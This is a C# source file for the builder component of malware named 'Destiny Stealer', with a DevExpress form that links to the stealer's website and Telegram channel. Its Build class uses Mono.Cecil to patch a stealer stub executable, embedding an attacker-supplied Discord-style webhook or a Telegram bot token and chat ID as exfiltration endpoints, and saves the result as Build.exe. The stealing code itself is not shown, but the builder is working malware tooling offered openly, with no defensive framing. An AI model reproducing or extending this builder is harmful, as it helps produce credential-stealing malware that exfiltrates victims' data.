using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Http;
using Microsoft.CodeAnalysis;
using System.Reflection;
using Mono.Cecil;
using System.Threading;



namespace Destiny_Stealer
{
    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {
        private TcpListener server;
        private int port;
        public Form1()
        {
            InitializeComponent();
        }

        private async void simpleButton1_Click(object sender, EventArgs e)
        {
           
        }

        // Helper method to safely invoke on the UI thread
        private Task InvokeAsync(Action action)
        {
            return Task.Run(() =>
            {
                if (InvokeRequired)
                    Invoke(action);
                else
                    action();
            });
        }

        private void countlistview1_Tick(object sender, EventArgs e)
        {
       
        }

        // stop : 
        private void simpleButton2_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox21_Click(object sender, EventArgs e)
        {
        }

        private void counting_Tick(object sender, EventArgs e)
        {


        }

        private void Form1_Load(object sender, EventArgs e)
        {
         
        
        }

        private void Form1_Resize(object sender, EventArgs e)
        {

        }

        private void panelControl9_Paint(object sender, PaintEventArgs e)
        {

        }

        private void simpleButton13_Click(object sender, EventArgs e)
        {


         
        }

        


        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void panelControl28_Paint(object sender, PaintEventArgs e)
        {

        }

        private void accordionControlElement4_Click(object sender, EventArgs e)
        {

        }

        private void xtraTabControl1_Click(object sender, EventArgs e)
        {

        }

        private void accordionControlElement2_Click(object sender, EventArgs e)
        {
     


        }

        private void accordionControlElement3_Click(object sender, EventArgs e)
        {


        }

        private void accordionControlElement6_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 0;

        }

        private void accordionControlElement7_Click(object sender, EventArgs e)
        {
           

        }

        private void accordionControlElement9_Click(object sender, EventArgs e)
        {
    
            Environment.Exit(1);
        }

        private void accordionControlElement3_Click_1(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 1;
        }

        private void simpleButton2_Click_1(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://destinystealer.com/");
        }

        private void simpleButton3_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://t.me/destinystealer");
        }

        private void simpleButton13_Click_1(object sender, EventArgs e)
        {
            try


            {
                Destiny.Builder.Build.ModifyAndSaveAssembly(textEdit3.Text, "Build.exe");
                MessageBox.Show(" { Build Success ! } : " + Environment.CurrentDirectory + "\\Build.exe", "Success!");

            }

            catch
            {
                MessageBox.Show("Error { Stub Not Found in Stub Folder.}");
            }
           

            
        }

        private void simpleButton1_Click_1(object sender, EventArgs e)
        {
            try


            {
                Destiny.Builder.Build.ModifytelegramAssembly(textEdit1.Text, textEdit4.Text, "Build.exe");
                Thread.Sleep(1500);
            

                MessageBox.Show(" { Build Success ! } : " + Environment.CurrentDirectory + "\\Build.exe", "Success!");

            }

            catch
            {
                MessageBox.Show("Error { Stub Not Found in Stub Folder.}");
            }

        }
    }
}


namespace Destiny.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string webhook, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("DestinyClient.Resources.webhook.txt", webhook, assembly);

        }

        public static void UpdateIPAndPortTelegram(string token, string chatid, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("DestinyClient.Resources.token.txt", token, assembly);
            UpdateResource("DestinyClient.Resources.chatid.txt", chatid, assembly);

        }

        public static void ModifytelegramAssembly(string token, string chatid,  string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientTelegram.exe";

                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);

                // Update the IP and Port resources
                UpdateIPAndPortTelegram(token, chatid, assembly);


                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }


        public static void ModifyAndSaveAssembly(string webhook, string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientWebHook.exe";

                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);

                // Update the IP and Port resources
                UpdateIPAndPort(webhook, assembly);

                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }
}
